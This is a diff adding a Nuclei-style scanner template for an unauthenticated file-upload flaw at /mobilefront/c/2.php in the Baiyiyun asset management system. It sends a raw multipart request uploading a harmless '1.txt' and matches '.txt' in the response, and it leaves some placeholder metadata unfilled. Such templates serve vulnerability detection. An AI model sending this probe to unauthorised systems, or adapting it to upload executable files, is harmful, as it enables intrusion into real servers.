@@ -1,0 +1,32 @@
+id: byy-mobilefront-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 湖南众合百易信息技术有限公司（简称：百易云）成立于2017年是一家专注于不动产领域数字化研发及服务的国家高新技术企业，公司拥有不动产领域的数字化全面解决方案、覆盖住宅、写字楼、商业中心、专业市场、产业园区、公建、后勤等多种业态、通过数字化帮助企业实现数字化转型，有效提高公司管理水平及业务办理效率、降低运营成本，公司自成立以来，已帮助众多企业实现数字化转型。资产管理运营系统mobilefront2前台文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /mobilefront/c/2.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 233
+
+        -----------------------------289666258334735365651210512949
+        Content-Disposition: form-data; name="file1"; filename="1.txt"
+        Content-Type: image/png
+
+        123
+        -----------------------------289666258334735365651210512949--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
